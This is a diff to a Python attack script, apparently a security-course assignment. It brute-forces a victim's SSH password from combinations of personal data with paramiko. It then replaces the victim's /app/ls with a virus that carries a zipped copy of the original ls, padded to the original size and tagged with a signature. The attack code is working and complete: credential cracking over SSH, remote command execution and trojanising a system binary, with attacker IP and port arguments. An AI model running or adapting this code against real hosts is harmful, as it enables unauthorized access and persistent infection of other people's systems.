@@ -1,10 +1,8 @@
 #!/usr/bin/env python3
 from itertools import combinations, permutations
 import paramiko
-import socket
 import time
 import sys
-import binascii
 
 def crack_ssh_passwd(victim_ip:str, username:str) -> paramiko.SSHClient:
     '''
@@ -12,7 +10,7 @@ def crack_ssh_passwd(victim_ip:str, username:str) -> paramiko.SSHClient:
     Crack the SSH password of the victim based on the personal information
     '''
     # Read the victim's personal information
-    with open('./victim.dat', 'r') as info_file:
+    with open('victim.dat', 'r') as info_file:
         info = info_file.read().splitlines()
     # Generate all possible combinations of the personal information
     for i in range(1, len(info)+1):
@@ -28,16 +26,16 @@ def crack(target_ip:str, user:str, password:str) -> paramiko.SSHClient:
     '''
     Utilize paramiko to build SSH connection with the client while catching exceptions
     '''
-    print(f"[*] Trying: {user}:{password}")
+    print(f"[*] Trying username: {user}, password: {password}")
     try:
         ssh_client = paramiko.SSHClient()
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh_client.connect(hostname=target_ip, username=user, password=password, timeout=15)
-        print(f"[+] Password Cracked: {user}:{password}")
+        print(f"[+] Password cracked for username: {user}, password: {password}")
         return ssh_client
     # Authentication failed
     except paramiko.AuthenticationException:
-        print(f"[!] Authentication failed for {user}:{password}")
+        print(f"[!] Username: {user}, password: {password} is incorrect!")
         return None
     # Other exceptions
     except Exception as e:
@@ -58,33 +56,30 @@ def infect_ls(client:paramiko.SSHClient, attacker_ip:str, attacker_port:str):
     _stdin, stdout, stderr = client.exec_command(f"ls -l {ls_path} | awk '{{print $5}}'")
     ls_size = stdout.read().decode().strip()
     
+    virus_path = "/app/ls"
+    
     # Create a file named virus and write the virus content to it
-    client.exec_command('echo "' + virus_content + '" > /app/ls')
+    client.exec_command(f'echo "{virus_content}" > {virus_path}')
     
     _stdin, stdout, stderr = client.exec_command(f"""
         zip -q new_ls {ls_path};
-        cat new_ls.zip >> /app/ls;
+        cat new_ls.zip >> {virus_path};
         ls -l new_ls.zip | awk '{{print $5}}'
         rm -f new_ls.zip;
     """)
     
     new_ls_size = stdout.read().decode().strip()
-    _stdin, stdout, stderr = client.exec_command("ls -l /app/ls | awk '{print $5}'")
+    _stdin, stdout, stderr = client.exec_command(f"ls -l {virus_path} | awk '{{print $5}}'")
     virus_size = stdout.read().decode().strip()
-    print(f"[*] ls size: {ls_size}")
-    print(f"[*] new_ls.zip size: {new_ls_size}")
-    print(f"[*] virus size: {virus_size}")
     
     padding_size = int(ls_size) - int(virus_size) - 8  # last 8 bytes for signature
-    
-    print(f"[*] Padding size: {padding_size}")
 
-    _stdin, stdout, stderr = client.exec_command('dd if=/dev/zero bs=' + str(padding_size) + ' count=1 >> /app/ls;')
-    _stdin, stdout, stderr = client.exec_command("""
-        echo -n '20240000aabbccdd' | xxd -r -p >> /app/ls;
-        chmod +x /app/ls;
+    _stdin, stdout, stderr = client.exec_command(f'dd if=/dev/zero bs={str(padding_size)} count=1 >> {virus_path};')
+    _stdin, stdout, stderr = client.exec_command(f"""
+        echo -n '20240000aabbccdd' | xxd -r -p >> {virus_path};
+        chmod +x {virus_path};
         """)
-    print(f"[*] Victim Infected !")
+    print(f"[*] Victim Infected! Check victim's {virus_path}")
     
 if __name__ == '__main__':
     # If the arguments are not provided, print the usage
@@ -96,7 +91,11 @@ if __name__ == '__main__':
     attacker_ip = sys.argv[2]
     attacker_port = sys.argv[3]
 
-    # task1
+    # Task 1 
     client = crack_ssh_passwd(victim_ip, 'csc2024')
-    # task 2 & 3
+    if not client:
+        print("Error! Cannot find the victim's password!")
+        sys.exit(1)
+
+    # Task 2 & 3
     infect_ls(client, attacker_ip, attacker_port)
